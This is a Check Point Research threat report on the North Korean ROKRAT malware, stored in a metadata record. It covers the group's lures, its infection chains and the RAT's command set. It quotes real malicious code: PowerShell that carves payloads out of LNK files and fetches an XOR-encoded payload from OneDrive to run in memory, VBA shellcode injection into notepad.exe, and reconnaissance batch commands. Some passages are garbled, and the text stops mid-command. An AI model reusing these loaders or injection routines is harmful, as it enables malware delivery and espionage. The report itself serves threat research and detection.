{
    "id": "bb08ebb9-8eee-4b5e-93f1-042fa7f769fa",
    "created_at": "2023-06-05T02:07:14.097177Z",
    "updated_at": "2025-03-27T02:16:37.239558Z",
    "deleted_at": null,
    "sha1_hash": "de5df8f6a29ecf0f47682ae7b8314b080c63ad91",
    "title": "2023-05-01 - Chain Reaction- RokRAT's Missing Link",
    "authors": "",
    "file_creation_date": "2023-06-04T12:24:29Z",
    "file_modification_date": "2023-06-04T12:24:29Z",
    "file_size": 2573565,
    "plain_text": "# Chain Reaction: ROKRAT’s Missing Link\n\n**research.checkpoint.com/2023/chain-reaction-rokrats-missing-link/**\n\n## Key findings\n\n\nMay 1, 2023\n\n\nCheck Point Research (CPR) continues to track the evolution of ROKRAT and its delivery methods.\nROKRAT has not changed significantly over the years, but its deployment methods have evolved, now utilizing archives containing LNK\nfiles that initiate multi-stage infection chains. This is another representation of a major trend in the threat landscape, where APTs and\ncybercriminals alike attempt to overcome the blocking of macros from untrusted sources. The first sample we will discuss below was first\ndiscovered in July 2022, the same month that Microsoft began enforcing this new rule.\nThe lures used as part of the ROKRAT infections are largely focused on South Korean foreign and domestic affairs. Most of those lures\nare in Korean, suggesting the targets are Korean-speaking individuals.\nOur findings suggest that various multi-stage infection chains used to eventually load ROKRAT were utilized in other attacks, leading to\nthe deployment of additional tools affiliated with the same actor. Those tools include another custom backdoor, GOLDBACKDOOR, and\nthe commodity malware Amadey.\n\n## Introduction\n\n[From the many reports on APT37 in recent months, to Mandiant’s announcement on APT43, a lot of attention is currently focused on North](https://www.mandiant.com/resources/blog/apt43-north-korea-cybercrime-espionage)\nKorean threat actors – and with good reason. North Korea has a long history of attacking its southern neighbor, especially by means of cyber\nwarfare which continues today. In this article, we describe a cluster of observed activity that deploys ROKRAT, a tool previously attributed to a\nNorth Korean threat actor commonly referred to as APT37, Inky Squid, RedEyes, Reaper or ScarCruft.\n\nIn previous years, ROKRAT infection chains usually involved a malicious Hangul Word Processor (HWP, a popular document format in South\nKorea) document with an exploit, or a Microsoft Word document with macros. While some ROKRAT samples still use these techniques, we\nhave observed a shift to delivering ROKRAT with LNK files disguised as legitimate documents. This shift is not exclusive to ROKRAT but\nrepresents a larger trend that became very popular in 2022. In July of that year, Microsoft began blocking macros in Office applications by\ndefault in an effort to minimize the spread of malware, and the first malware sample we discuss was discovered in the same month.\n\nIn our report, we discuss various infection chains and lures used by APT37 in their recent attacks, and the resulting payloads of ROKRAT and\nAmadey. Finally, we dive deeply into a technical analysis of ROKRAT.\n\nWhile we were in the final stages of preparing this blogpost, another report containing a technical analysis of one of the ROKRAT campaigns\nwas [published. While it overlaps with our findings to some extent, we believe that our report provides important information about additional](https://asec.ahnlab.com/en/51751/)\ncampaigns by APT37, as well as a deep analysis of the ROKRAT malware.\n\n## Background\n\n\n-----\n\n[st epo ted by a os](https://blog.talosintelligence.com/introducing-rokrat/) p 0, O (a so o as OGC ) as bee co s ste t y att buted to 3 yp ca y, t s too as\nused to target government sectors in South Korea as well as journalists, activists, and North Korean defectors. According to the initial report,\none of the ROKRAT samples utilized Twitter as its Command and Control (C&C) infrastructure, while the other relied on Yandex and Mediafire.\nThe latter sample more closely resembles how ROKRAT operates today, relying on cloud file storage services as a C&C mechanism.\n\nOriginally supporting only Windows, over the years ROKRAT has adapted to other platforms, with macOS and Android versions discovered in\n[the wild. The macOS version, also known as CloudMensis, was first described by ESET in July 2022. Although Android versions of ROKRAT](https://www.welivesecurity.com/2022/07/19/i-see-what-you-did-there-look-cloudmensis-macos-spyware/)\n[have existed for a long time, InterLab and](https://interlab.or.kr/archives/2567) [S2W both introduced a newer version of ROKRAT on Android, known as RambleOn (Cumulus). All](https://medium.com/s2wblog/scarcruft-bolsters-arsenal-for-targeting-individual-android-devices-97d2bcef4ab)\nof this demonstrates that this malware is still being actively developed and distributed.\n\n[Many of the tools attributed to APT37 are custom-written tools like ROKRAT, including (but not limited to) the recently reported M2RAT, Konni](https://asec.ahnlab.com/en/48063/)\n[RAT, Chinotto, and GOLDBACKDOOR. However, the actors also use commodity malware such as Amadey. Using commodity malware makes](https://www.anquanke.com/post/id/230116)\nit more difficult to attribute the attack to a specific group, as it’s widely available and anyone can acquire it.\n\nAs documented in recent publications, the threat actors have been active lately. In February, AhnLab [reported a new RAT named Map2RAT or](https://asec.ahnlab.com/en/48063/)\nM2RAT for short. This RAT utilizes steganography tricks by hiding executables inside JPEG files to evade detection. In\nMarch, [Sekoia and](https://blog.sekoia.io/peeking-at-reaper-surveillance-operations-against-north-korea-defectors/) [ZScaler both published accounts of APT37’s use of phishing sites and PowerShell backdoors, the latter of which led to the](https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37)\ndeployment of another implant named Chinotto.\n\n## Lures and Infection Chains\n\nOver the past four months, we observed multiple infection chains leading to ROKRAT deployment. In most cases, an LNK file initiates the\ninfection, although in a few a DOC file was used for the same purpose (the method in previous ROKRAT attacks). During our analysis of the\nROKRAT infection chain, we came across a similar chain leading to the deployment of Amadey, a commercial RAT sold in underground\nforums. Although the nature of the attacks is different, we believe all of those were crafted by the same actors.\n\nFigure 1 – Timeline of lures and infection chains.\n\n## Decoy LNK Infection Chains\n\nIn April 2022, [Stairwell published a detailed analysis of GOLDBACKDOOR, a malware utilized in a targeted attack against South Korean](https://stairwell.com/wp-content/uploads/2022/04/Stairwell-threat-report-The-ink-stained-trail-of-GOLDBACKDOOR.pdf)\njournalists. Stairwell provided a thorough analysis of an infection chain that utilizes large LNK files running PowerShell, leading to the\nexecution of the newly discovered malware while dropping a decoy document. This technique is a unique implementation of a publicly\n[available tool called EmbedExeLnk.](https://www.x86matthew.com/view_post?id=embed_exe_lnk)\n\nAlthough first linked to GOLDBACKDOOR, analysis of recent lures tied to APT37 suggests this technique has become a prominent method\nused to deliver another tool associated with the same actor, namely ROKRAT. The implementation of ROKRAT and GOLDBACKDOOR loading\nmechanisms are so similar that differentiating between the two is only possible upon retrieving the payload.\n\nOver the last few months, we were able to identify multiple lures utilizing this unique implementation delivered in ZIP and ISO archives. Only\nsome of these lures were confirmed to lead to ROKRAT deployment. All of the lures used the theme of South Korean domestic and foreign\naffairs.\n\n### July 2022 – National Assembly Committees\n\n\n-----\n\nThe earliest indication of the above-mentioned infection chain was found in a ZIP file named (0722)상임위원회 및 상설특별위원회 위원 명단(최\n\n종).zip ((0722) Standing Committee and Standing Special Committee Member List (final).zip). This ZIP file contains an LNK with\nthe same name and looks very similar to the LNK loader that was used for GOLDBACKDOOR.\n\nIn this case, a decoy HWP document is dropped and opened. The document contains information about committees in the National Assembly,\nthe South Korean parliament. Based on the timestamp of the ZIP archive, it appears that the document became publicly available on the\nNational Assembly’s [website and was weaponized within a single day. Unfortunately, we were not able to get the end payload in this infection](https://www.assembly.go.kr/portal/prevew/docsPreview/previewDocs.do?atchFileId=1a0de076f56a4c5483b505df3b7c4d35&fileSn=1&viewType=CONTBODY)\nchain, though it is highly likely it was either GOLDBACKDOOR or ROKRAT.\n\nFigure 2 – Decoy HWP document about committees in the South Korean National Assembly.\n\n### January 2023 – Projects in Libya\n\nAt the beginning of February 2023, we came across another new sample of ROKRAT. This time, the actors used a ZIP archive,\nnamed projects in Libya.zip, which contains several stolen documents. In the malicious archive, there were three benign files called MFZ\n```\nExecutive Summary Korea.pdf, Proposed MOU GTE Korea.docx, and Proposed MOU GTE Korea.pdf. The fourth file was a suspiciously large\n\n```\nLNK, approximately 42.5 MB, masquerading as a PDF file named Pipelines Profile (Elfeel- Sharara-Mellitah + Wafa ```\nMellitah).pdf. Unlike all of the other lures we saw, this one was in English.\n\n```\nAll the documents in this archive are connected to the Libyan Oil & Gas industry. The three benign documents are about a project involving a\nLibyan oil company called Geotech Energy and a South Korean consultant company called Tundrabiz. The decoy document that is opened\nafter clicking the malicious LNK shows the profiling of an oil pipeline from 2005 by Enppi, an international contractor that specializes in projects\nin the oil and gas industries.\n\n\n-----\n\nFigure 3 – Pipelines Profile (Elfeel- Sharara-Mellitah + Wafa – Mellitah).pdf.\n\n\n-----\n\nFigure 4 – MFZ Executive Summary\n\nKorea.pdf.\n\n### April 2023 – North Korea Diplomacy\n\nAt the beginning of April, we saw a similar infection chain from an ISO file that led to ROKRAT. The sample contained two malicious LNKs\ninside named 북 외교관선발파견 및 해외공관.lnk (Selection and Dispatch of North Korean Diplomats and Overseas Missions.lnk)\nand 북한외교정책결정과정.lnk (North Korea foreign policy decision-making process.lnk). Both LNKs contain and drop decoy HWP files,\nwhich is a common document format in South Korea and is widely used by North Korean threat actors to distribute malware. The files are\nnamed 230401.hwp and 230402.hwp, respectively. These names likely indicate the dates April 1 and April 2, 2023, just a few days before the\nISO archive was discovered. Both decoy documents contain articles regarding diplomacy and policy decisions of South Korea toward North\nKorea.\n\n\n-----\n\nFigure 5 – North\n\nKorea’s Selected and Dispatch of Diplomats and Operation of Overseas Missions article by Chulmin Han, Former North Korean diplomat in\nAfrica (230401.hwp). Automatic translation on the right.\n\n### April 2023 – Korean Association for Public Administration\n\nOn April 19, another pair of LNKs were discovered. This time, there was no archive file; the LNKs were uploaded separately to VirusTotal and\nwere not given meaningful names. However, based on the pattern we observed, they were probably named according to the PDF file they both\ncontain: 2023년도 4월 29일 세미나.pdf (April 29, 2023 Seminar.pdf). This decoy PDF file details a seminar that it claims will happen on\nApril 29, 2023, at the [Korean Association for Public Administration, and includes a Zoom link and itinerary.](https://www.kapa21.or.kr/)\n\nEven though the two LNKs dropped the same document and script, one file was 10 MB and the other nearly 50 MB, due to different amounts\nof padding inside the LNK files. Unfortunately, at the time of analysis, the payload hosted on OneDrive had already been taken down, so we\nare unsure of the final payload. However, we believe that it was probably ROKRAT or GOLDBACKDOOR.\n\n\n-----\n\nFigure 6 – Lure document 2023년도 4월\n\n29일 세미나.pdf (April 29, 2023 Seminar.pdf).\n\n### LNK Infection Chain Analysis\n\nAll of the LNKs discussed above lead to nearly the same infection chain. An example of the infection is depicted below, as demonstrated in the\n“Projects in Libya” archive:\n\n\n-----\n\nFigure 7 – Infection chain for “Projects in Libya” lure.\nClicking the malicious LNK file triggers the execution of a PowerShell, and initiates the following infection chain:\n\n1. The PowerShell extracts a document file from the LNK, drops it to the disk, and then opens it. This file is a decoy to trick users into\n\nthinking they simply opened a normal PDF or HWP file.\n2. The PowerShell extracts a BAT script from the LNK, drops it to the disk, and executes it.\n```\n   $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath =\n   'C:\\Users\\admin\\AppData\\Local\\Temp'}; $lnkpath = Get-ChildItem -Path $dirPath -Recurse *.lnk | where-object\n   {$_.length -eq 0x0002A8F60E} | Select-Object -ExpandProperty FullName; $pdfFile = gc $lnkpath -Encoding Byte    TotalCount 03568692 -ReadCount 03568692; $pdfPath = 'C:\\Users\\admin\\AppData\\Local\\Temp\\230130.pdf'; sc $pdfPath\n   ([byte[]]($pdfFile | select -Skip 003388)) -Encoding Byte; & $pdfPath; $exeFile = gc $lnkpath -Encoding Byte    TotalCount 03571940 -ReadCount 03571940; $exePath = 'C:\\Users\\admin\\AppData\\Local\\Temp\\230130.bat'; sc $exePath\n   ([byte[]]($exeFile | select -Skip 03568692)) -Encoding Byte; & $exePath;\n\n```\n1. The BAT script executes a new PowerShell instance that downloads a payload from OneDrive, decodes it by taking the first byte of the\n\npayload as a key, and XORs it with the remainder of the payload.\n2. The resulting payload is reflectively injected into PowerShell, causing it to run as a new thread.\n3. The shellcode decodes the ROKRAT portion of the payload with a four-byte XOR key and executes it.\n\n\n-----\n\n```\n   $aa='[DllImport(\"kernel32.dll\")]public static extern IntPtr GlobalAlloc(uint b,uint c);'\n\n   $b=Add-Type -MemberDefinition $aa -Name \"AAA\" -PassThru\n\n   $abab = '[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtect(IntPtr a,uint b,uint c,out IntPtr d);'\n\n   $aab=Add-Type -MemberDefinition $abab -Name \"AAB\" -PassThru\n\n   $c = New-Object System.Net.WebClient\n\n   $d=\"https://api.onedrive.com/v1.0/shares/u!aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBalFOTHZFRV9DVU9iUFdnLXhPZG8xRXFYckU_ZT1BM1QwV2Q/root/co\n\n   $bb='[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);'\n\n   $ccc=Add-Type -MemberDefinition $bb -Name \"BBB\" -PassThru\n\n   $ddd='[DllImport(\"kernel32.dll\")]public static extern IntPtr WaitForSingleObject(IntPtr a,uint b);'\n\n   $fff=Add-Type -MemberDefinition $ddd -Name \"DDD\" -PassThru\n\n   $e=112\n\n   do {\n\n     try {\n\n       $c.Headers[\"user-agent\"] = \"connnecting...\"\n\n       $xmpw4=$c.DownloadData($d)\n\n       $x0 = $b::GlobalAlloc(0x0040, $xmpw4.Length+0x100)\n\n       $old = 0\n\n       $aab::VirtualProtect($x0, $xmpw4.Length+0x100, 0x40, [ref]$old)\n\n       for ($h = 1; $h -lt $xmpw4.Length; $h++)\n\n       {  [System.Runtime.InteropServices.Marshal]::WriteByte($x0, $h-1, ($xmpw4[$h] -bxor $xmpw4[0]) ) }\n\n       try {  throw 1 }\n\n       catch {\n\n         $handle=$ccc::CreateThread(0,0,$x0,0,0,0)\n\n         $fff::WaitForSingleObject($handle, 500*1000) }\n\n       $e=222 }\n\n     catch  {\n\n       sleep 11\n\n       $e=112 }\n\n   } while($e -eq 112)\n\n## Classic ROKRAT Infection Chain\n\n```\nWhile adopting new behavior to keep up with the shifting threat landscape, ROKRAT operators still stick to some old habits. In parallel to the\nnewly identified method described above, ROKRAT is still deployed using malicious Word documents.\n\nIn December 2022, a malicious Word document named 사례비_지급의뢰서.doc (Case fee_Payment request.doc) was submitted to VirusTotal.\nThe document itself contains a short form to enter personal and banking information. However, closer inspection of the document reveals\nreferences to the Ministry of Unification, a ministry in the South Korean government that is responsible for guiding policy with North Korea and\ndealing with North Korean defectors, with the ultimate goal of reuniting the two countries.\n\nFigure 8 – Infection chain for “Projects in Libya” lure.\n\n\n-----\n\nO ce t e use ope s t e a c ous docu e t a d a o s t e ac o to e ecute, t e o o g ect o c a s t gge ed\n\n1. The macro checks and ensures it has access to the Visual Basic project by setting the AccessVBOM registry key to load additional code.\n2. The macro decodes a new VBA script, writes it to a new module in the macro, and then executes it. This is done without dropping any of\n\nthe code to the disk.\n3. The second VBA script runs notepad.exe and injects shellcode into it.\n4. The shellcode runs inside notepad.exe and reaches out to OneDrive to download the ROKRAT payload and execute it in memory.\n```\n   src_str = Array(&H55, &H8B, &HEC, &H83, &HEC, &H2C, &H50, &HE8, &H4, <truncated>...\n\n     #If Win64 Then\n\n       Dim FSO As Object\n\n       Set FSO = CreateObject(\"Scripting.FileSystemObject\")\n\n       Dim windowsDir As String\n\n       windowsDir = FSO.GetSpecialFolder(0)\n\n       windowsDir = windowsDir & \"\\SysWOW64\\notepad.exe\"\n\n       ReturnValue = CreateProcessA(0, windowsDir, 0, 0, False, 0, 0, 0, start, proc)\n\n     #Else\n\n       ReturnValue = CreateProcessA(0, \"notepad.exe\", 0, 0, False, 0, 0, 0, start, proc)\n\n     #End If\n\n     PID = proc.dwProcessID\n\n     If PID Then hTargetProcHandle = OpenProcess(PROCESS_ALL_ACCESS, False, PID) Else Exit Sub\n\n     dwCodeLen = &H800\n\n     shellAddr = VirtualAllocEx(hTargetProcHandle, ByVal 0, dwCodeLen, &H3000, PAGE_EXECUTE_READWRITE)\n\n     hGlobalMemory = GlobalAlloc(GHND, UBound(src_str))  \n\n     For i = LBound(src_str) To UBound(src_str)\n\n       bValue = src_str(i)\n\n       RtlMoveMemory hGlobalMemory + i, bValue, 1\n\n     Next i\n\n     Dim resultWriteProcess\n\n     resultWriteProcess = WriteProcessMemory(hTargetProcHandle, shellAddr, hGlobalMemory, UBound(src_str) + 1, ret)\n\n     hThread = CreateRemoteThread(hTargetProcHandle, ByVal 0, 0, shellAddr, 0, 0, 0)\n\n```\n[The infection chain described here is extremely similar to what MalwareBytes reported in January 2021, which also deployed ROKRAT by](https://www.malwarebytes.com/blog/news/2021/01/retrohunting-apt37-north-korean-apt-used-vba-self-decode-technique-to-inject-rokrat)\ninjecting shellcode into notepad.exe and loading the RAT in memory. However, the samples described in the MalwareBytes research had\ncompilation dates from 2019, whereas the new ROKRAT sample we discovered appears to have been compiled on December 21, 2022, only\nsix days before the document was submitted to VirusTotal.\n\nAdditionally, there is another document recently discovered in April 2023 that appears to be part of the same infection chain, only this time the\ntarget process for injection is mspaint.exe. The document references a few subjects such as Kim Jong-Un’s potential successor and North\nKorea’s nuclear weapon capabilities. Unfortunately, at the time of our analysis, the URL was no longer replying to the request to download the\npayload. However, it is highly likely that this document was also intended to deliver ROKRAT.\n\n## The Amadey Connection\n\nAt the beginning of November 2022, a file called securityMail.zip was submitted to VirusTotal. This ZIP contained two LNKs which were\nboth suspiciously large at just under 5 MB. The implementation of PowerShell commands within the two LNKs is unique and overlaps only with\nROKRAT and GOLDBACKDOOR LNK infections. This specific infection chain, however, ends up deploying Amadey, a commodity malware\n[available for sale on cybercrime forums. Amadey was linked in the past to Konni, another cluster of activity that aligns with APT37.](https://blog.alyac.co.kr/2308)\n\n\n-----\n\nFigure 9 – Infection chain for the “Security Mail” lure.Opening either of these LNKs results in a similar flow:\n\n1. A PowerShell command extracts a decoy HTML file from the LNK and drops it to disk, in a similar manner to ROKRAT infection chains:\n```\n   $dirPath = Get-Location;$lnkpath = Get-ChildItem -Path $dirPath -Recurse *.lnk | where-object {$_.length -eq 0x0000472484} |\n   Select-Object -ExpandProperty FullName;if($lnkpath.length -eq 0) {$dirPath = \\\"$env:temp\\\";$lnkpath = Get-ChildItem -Path\n   $dirPath -Recurse *.lnk | where-object {$_.length -eq 0x0000472484} | Select-Object -ExpandProperty FullName;};$pdfFile = gc\n   $lnkpath -Encoding Byte -TotalCount 00090300 -ReadCount 00090300;$pdfPath = \\\"$env:temp\\securityMail_1031.html\\\"; sc $pdfPath\n   ([byte[]]($pdfFile | select -Skip 004386)) -Encoding Byte; & $pdfPath;$exeFile = gc $lnkpath -Encoding Byte -TotalCount\n   04662404 -ReadCount 04662404;$exePath=\\\"$env:public\\11702.zip\\\";sc $exePath ([byte[]]($exeFile | select -Skip 00090300))    Encoding Byte;$shell = new-object -com shell.application;$zip = $shell.Namespace($exePath);if($zip.items().count -gt 0)\n   {$executemodule = $env:public + '\\' + $zip.items().item(0).name;$shell.Namespace($env:public).CopyHere($zip.items().item(0),\n   1044) | out-null;  remove-item -path $exePath -force;$batPath=\\\"$env:public\\27868.bat\\\";$cmdline=\\\"rundll32.exe\n   `\\\"$executemodule`\\\",Run`r`ndel /f /q %0\\\";sc $batPath $cmdline;start-process -filepath $batPath -windowstyle hidden;}\n\n```\n1. This PowerShell also extracts a ZIP archive from the LNK, which contains a DLL. The DLL is then dropped to disk as mfc100.dll.\n2. The PowerShell finally extracts a BAT script from the LNK as well, dropping it to disk and executing it.\n3. The BAT script runs the DLL with rundll32.exe and deletes itself.\n```\n   rundll32.exe \"C:\\Users\\Public\\mfc100.dll\",Run\n\n   del /f /q %0\n\n```\n[An initial analysis of the DLL file revealed that it is packed with Themida, a commercial code protection solution. After analyzing a memory](https://www.oreans.com/Themida.php)\ndump of its execution, we were able to confirm that this was in fact Amadey. The decoy HTML file contains a fake login page for Kakao Bank, a\npopular bank in South Korea. Further analysis of the HTML revealed that it is not used for password phishing, but to hide the threat actors’\nintentions.\n\n\n-----\n\nFigure 10\n\n– Fake Kakao Bank login page (automatic translation on the right).\n\n## ROKRAT Technical Analysis\n\nROKRAT is just one of the many custom tools used by this threat actor, but is definitely versatile and powerful. ROKRAT primarily focuses on\nrunning additional payloads and extensive data exfiltration. It relies on cloud infrastructure for C&C functions, including DropBox, pCloud,\nYandex Cloud, and OneDrive. ROKRAT also collects information about the machine to prevent further infection of unintended victims.\n\nWhile it’s no secret that ROKRAT has not significantly changed in the last few years, this can be attributed to its slick use of in-memory\nexecution, disguising C&C communication as potentially legitimate cloud communication, and additional layers of encryption to hinder network\nanalysis and evade network signatures. As a result, there are not a lot of recent published articles about ROKRAT.\n\n### General Malware Structure\n\nMost samples of ROKRAT have a very simple WinMain function. All of the samples analyzed so far contain a data collection functionality\n(CollectMachineData, as seen in Figure 11 below) which is executed before the execution of the Main RAT thread (MainRATThread). This\nthread initializes the RAT and runs a loop to try and get commands from the C&C, and then parses and executes them.\n\nThere are two additional functionalities embedded into the WinMain function that we only observed in a subset of the samples. The first checks\nif the RAT is able to write to the TEMP directory (CheckTemp, as seen in Figure 11 below). The second one creates a thread\n(KillCertainProcessesThread) to kill certain processes linked to previous infection vectors that exploited vulnerabilities in Hancom Office.\n\nFigure 11 – An example of a WinMain\n\nfunction in ROKRAT.\n\n### Victim Fingerprinting and Evasions\n\nOne of the first functions that ROKRAT calls when it executes is designed to collect data about the infected machine. In this phase of infection,\nthis is likely to help the attackers distinguish if this is a desired target or not, and then act accordingly.\n\nIn this function (and many others), ROKRAT uses encrypted strings to prevent some of the techniques used from being visible to static\nanalysis. The information collected here includes whether the program is running on WOW64 (indicating 32-bit applications running on 64-bit\nwindows), the version of vmtoolsd.exe (VMWare Tools Daemon, if installed), SMBIOS data from the registry, and the system BIOS version\nfrom the registry as well.\n\n\n-----\n\ne a so co ects t e use a e, ac e a e, a d t e u pat to t e e ecutab e e e e t e s e ecut g e atte s po ta t\nbecause the infection chain usually involves injecting a ROKRAT PE file into an existing process’s memory. In other words, this allows the\nattackers to see if ROKRAT is executing in the expected process, such as powershell.exe or notepad.exe. Finally, the function checks to see\nif the executable has permission to create a file for writing under C:\\Windows.\n\nFigure 12 –\n\nCollectMachineData collects various information about the infected machine.\nWhile a lot of the target’s data is collected in the function mentioned above, there is another data collection function that runs in the context of\nthe main RAT thread before ROKRAT starts accepting commands. This second function check calls the IsDebuggerPresent API, storing the\nresult as a character (0 or 1). In addition, it calls a function to grab a screenshot of the machine.\n\nThe data collection carried out in the main thread will be executed, sending the collected each time ROKRAT attempts to get commands.\n\nIn this same function, some samples also check if there is a running process named 360Tray.exe, a process that is part of an antivirus\nsoftware called 360 Total Security. The result is stored in a global Boolean variable and is accessed in a separate function used to execute\nshellcode payloads. Interestingly, if the process was found, ROKRAT doubles the timeout period it waits for the shellcode to finish running from\n24 seconds to 48 seconds. If the shellcode runs past the timeout period and 360Tray.exe was not previously detected, ROKRAT attempts to\nterminate the shellcode thread.\n\nAs previously mentioned, some ROKRAT samples execute a thread called KillCertainProcessesThread. This thread kills two\nprocesses, gbb.exe and gswin32c.exe, which are responsible for parsing postscript data in Hancom Office. In the past, ROKRAT samples\nhave come from malicious HWP documents that exploit these processes to gain code execution. Most likely, this is code left over from trying to\nclean any traces of exploitation from previous campaigns.\n\nInstead of using hardcoded or encrypted strings for these process names, ROKRAT instead contains a simple hashing algorithm that\ndetermines a process name based on an integer value. It works in the following way:\n```\ndef calculate_hash(process_name):\n\n  hash_value = 5381 # Initial value\n\n  for current_char in process_name.upper():\n\n    hash_value = ord(current_char) + 33 * hash_value\n\n  return hash_value & 0xFFFFFFFF # Return as 32-bit integer\n\n### C&C Communication\n\n```\nIn each of the ROKRAT samples we analyzed, the malware configuration contained an ID number representing the cloud infrastructure, and\nthe API token to use it. The ID number can have the following values to correspond to different cloud providers, as well as a test mode that\nallows the RAT to communicate with the local machine:\n\n1 – Local machine (no cloud)\n3 – Dropbox\n4 – pCloud\n5 – Yandex\n\n\n-----\n\nFigure 13 – Switch case statement for the cloud\n\nstorage provider.\nFurther analysis indicates that there are usually two C&C configurations, one used as the primary infrastructure and the second as a backup.\nIn the latest samples we discovered, the primary C&C was pCloud and the secondary was Yandex Cloud.\n\nROKRAT starts with initializing the token and then gets the folder content from the C&C to make sure it has access and the token is valid:\n\nFigure 14 – GET request headers to list\n\nfolder directory in pCloud.\nThe names for the files that ROKRAT uses are generated based on GetTickCount API and random values from the rand API with the time of\nexecution as a seed.\n\nROKRAT uploads a file to the server that contains the following information about the victim machine:\n\nHardcoded value 0xBAADFEDE – Used later in the C&C communication\n```\n   IsDebuggerPresent value\n\n```\nScreenshot image the malware previously saved to the following path: %TEMP%\\<16 hex digits>.tmp\nProcesses data – pid:<PID>,name:<process name>,path:<file name> for every working process\nTick Count\nXOR keys – Used for decrypting commands and payloads from the C&C\nGenerated filenames – Used later for downloading and executing payloads in certain commands\n```\n   IsWow64Process flag\n\n```\nWindows Version\nComputer Name\nUsername\nMachine Type – Obtained by querying SMBiosData registry value\nunder HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data\nVMware tools version data\nSystem BIOS version\n\nTo further hide its tracks, ROKRAT labels the data collected about the victim’s machine as MP3:\n\nFigure 15 – POST request headers to send encrypted\n\ndata gathered from the victim machine to pCloud.\nFirst, the data is XORed with a random four-byte key. For this reason, the data begins with a hardcoded four-byte value 0xBAADFEDE. As the\nattackers know the hardcoded value, they can derive the XOR key by XORing the first four bytes of the XORed data with 0xBAADFEDE to\nretrieve the key. The XORed data is then encrypted with AES-CBC. Finally, the AES key is encrypted with a hardcoded RSA public key to\nensure that the payload can only be decrypted with the RSA private key.\n\n\n-----\n\nesp te t e act t at C&C co u cat o s a eady e c ypted S t a c, O ta es t a step u t e by e c ypt g data up oaded to\nthe C&C with AES. When the malware initializes, it generates two random 16-byte values, which serve as a basis for the AES keys used to\nencrypt commands and payloads. The malware also comes with a hardcoded 16-byte value, which is then XORed against the two randomized\nvalues. The result is two AES keys, one that is used to encrypt and decrypt commands, and one that is used to encrypt and decrypt payloads.\n\n### ROKRAT Commands\n\nEach command is identified by a single character. Some of the commands take arguments, and they are supplied just after the command ID\ncharacter. After the correct command is identified, the code parses the arguments according to the type of command. The following table lists\nthe commands we discovered in ROKRAT, together with their expected arguments and actions:\n\n\n**Command**\n**ID**\n\n\n**Command**\n**Meaning** **Arguments** **Description**\n\n\n0 Stop\ncollecting\ndata\n\n1, 2 Execute\nshellcode\n\n3, 4 Execute\nshellcode\nwith a new\ntoken\n\n5, 6 Execute\nPE file\n\n7, 8, 9 Execute\nPE file\nwith a new\ntoken\n\nc Exfiltrate\nfiles\n\n\n– –\n\nURL Downloads shellcode from the URL and runs it with CreateThread. It writes Success or\nFailed to a file named out.txt. It also adds information about the victim’s computer and\nsends it back to the C&C server.\n\nNew cloud API token Initializes cloud provider information and then downloads shellcode from the C&C server.\nROKRAT expects the shellcode to exist in the generated file name it gave the C&C server\nat the initial data collection. It then executes the shellcode with CreateThread and writes\nSuccess or Failed to a file named out.txt. It also adds information about the victim’s\ncomputer and sends it back to the C&C server.\n\nURL Downloads a PE file from the URL, writes it to KB400928_doc.exe, and then executes it.\n\nNew cloud API token Initializes cloud provider information and then downloads a PE file from the C&C server.\nROKRAT expects the shellcode to exist in the generated file name it gave the C&C server\nat the initial data collection. It writes the file to KB400928_doc.exe, and then executes it.\n\n\nFile/Directory to\nsearch.\n\nExtensions of files to\ngather – All, Normal\n(doc, xls, ppt, txt,\nm4a, amr, pdf, hwp)\nor specific\nextensions\n\n\nLooks for files specified by arguments and uploads them to the C&C server.\n\n\nd Cleanup – Cleanup of the whole flow, which differs from sample to sample.\n\n\ne Run a\ncommand\n\n\ncommand Executes a command with cmd.exe.\n\n\nf Cleanup – Similar to the d command, but deletes fewer things. It can vary from sample to sample.\n\n\nh Enumerate\nfiles on\ndrives\n\ni Send\nvictim data\nto C&C\n\nj/b Kill\nsession\n\n\n– Collects drives’ info with the command dir /A /S : >> “%temp%/_.TMP”\n\n– Gathers the victim’s information and sends it to the C&C server.\n\n– Kills the RAT.\n\n\nUpon receiving the cleanup command (d), ROKRAT runs the following commands to delete persistence mechanisms not initially used by the\nmalware. They might be related to some post-infection activity.\n```\n   reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OfficeBootPower /f & reg delete\n   HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OfficeBootPower /f & del c:\\programdata\\30\n   del \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*.VBS\" \"%appdata%\\*.CMD\" \"%appdata%\\*.BAT\"\n   \"%appdata%\\01\" \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\.lnk\"\n   \"%allusersprofile%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*.lnk\" /F /Q\n\n```\nUpon receiving commands 1–4, ROKRAT creates a file called out.txt, which contains information about the system:\n\n\n-----\n\n```\necho ======================AppDataStartup>>\"%temp%\\out.txt\" &\n\ndir /a \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\">>\"%temp%\\out.txt\" &\n\necho ======================AllUsersProfileStartup>>\"%temp%\\out.txt\" &\n\ndir /a \"%allusersprofile%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\">>\"%temp%\\out.txt\" &\n\necho ======================SystemInfo>>\"%temp%\\out.txt\" &\n\nsysteminfo>>\"%temp%\\out.txt\" &\n\necho ======================RoutePrint>>\"%temp%\\out.txt\" &\n\nroute print>>\"%temp%\\out.txt\" &\n\necho ======================IpConfig>>\"%temp%\\out.txt\" &\n\nipconfig /all>>\"%temp%\\out.txt\" &\n\necho ======================ARP>>\"%temp%\\out.txt\" &\n\narp -a>>\"%temp%\\out.txt\" &\n\necho ======================Recent>>\"%temp%\\out.txt\" &\n\ndir /a \"%appdata%\\Microsoft\\Windows\\Recent\">>\"%temp%\\out.txt\" &\n\necho ======================WMIC>>\"%temp%\\out.txt\" &\n\nwmic startup >> \"%temp%\\out.txt\" &\n\necho ======================LocalAppData>>\"%temp%\\out.txt\" &\n\ndir 